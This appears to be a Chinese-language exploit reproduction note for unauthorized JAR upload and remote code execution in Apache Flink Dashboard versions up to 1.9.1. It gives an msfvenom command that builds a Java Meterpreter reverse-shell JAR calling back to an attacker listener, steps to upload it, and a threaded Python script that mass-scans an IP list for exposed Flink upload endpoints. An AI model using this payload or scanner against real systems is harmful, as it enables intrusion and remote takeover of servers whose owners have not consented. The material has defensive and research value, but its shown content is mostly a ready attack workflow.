# Apache Flink Dashboard 未授权访问-远程代码命令执行

## 一、漏洞简介

Apache Flink的任意Jar包上传导致远程代码执行的漏洞

## 二、漏洞影响

<= 1.9.1(最新版本)

## 三、复现过程

1、


```bash
msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.20.166 LPORT=8989 -f jar > rce.jar
```

![](images/15889388273429.png)


2、

上传alewong Jar包

![](images/15889388392029.png)


![](images/15889388450122.png)


批量脚本

https://github.com/ianxtianxt/Apache-Flink-Dashboard-rec


```python
"""
auth: @l3_W0ng
version: 1.0
function: Apache Web Dashboard RCE
usage: python3 script.py ip [port [command]]
               default port=8081
"""



import os
import subprocess
import requests
from multiprocessing.dummy import Pool as ThreadPool


def get_iplist():
    iplist = []
    with open('iplist', 'r') as file:
        data = file.readlines()
        for item in data:
            ip = item.strip()
            iplist.append(ip)

    return iplist


def check_8081(ip):
    url = 'http://' + ip + ':8081/jar/upload'

    try:
        res = requests.get(url=url, timeout=2)
        data = {
            'msg': res.json(),
            'state': 1,
            'url': url,
            'ip': ip
        }

    except:
        data = {
            'msg': 'Secure',
            'state': 0,
            'ip': ip
        }

    if data['state'] == 1:
        print(data)


if __name__ == '__main__':
    iplist = get_iplist()

    pool = ThreadPool(20)
    pool.map(check_8081, iplist)
```

Ps:

当注释掉 if 'Unable to load requested file' in str(data):

之后，出现Token为空，或者 Unauthorized request 时候是不存在未授权访问的，而是带授权